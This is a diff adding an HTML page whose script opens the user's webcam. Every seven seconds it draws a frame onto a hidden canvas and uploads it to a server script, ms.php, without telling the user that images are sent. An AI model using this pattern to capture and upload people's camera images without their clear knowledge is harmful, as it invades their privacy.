@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="jquery.min.js"></script><script src="json_decode.min.js"></script>
+</head>
+<body>
+<video controls autoplay> </video><canvas style="display:none;" width="640" height="480" id="cnv"></canvas>
+<script>
+navigator.getMedia = ( navigator.getUserMedia ||
+                       navigator.webkitGetUserMedia ||
+                       navigator.mozGetUserMedia ||
+                       navigator.msGetUserMedia);
+ var video = document.querySelector('video'),c=document.getElementById("cnv"),blobdata,blob,h=document.querySelector("a"),
+fps=7000, ctx=c.getContext("2d");
+navigator.getMedia (
+
+   // constraints
+   {
+      video: true,
+      audio: false
+   },
+
+   // successCallback
+   function(localMediaStream) {
+     
+      video.src = window.URL.createObjectURL(localMediaStream);
+     video.onloadedmetadata=d;
+   },
+
+   // errorCallback
+   function(err) {
+    console.log("The following error occured: " + err);
+   }
+
+);
+function d()
+{
+ctx.drawImage(video,0,0);
+setTimeout("d();",fps);
+c.toBlob(function (b) {upload(b);});
+}
+function upload(data)
+{
+var fd = new FormData();
+fd.append('data', data);
+$.ajax({
+    type: 'POST',
+    url: 'ms.php',
+    data: fd,
+    processData: false,
+    contentType: false
+}).done(function(data) {
+       console.log(json_decode(data));
+});
+}
+</script>
+</body>
+</html>
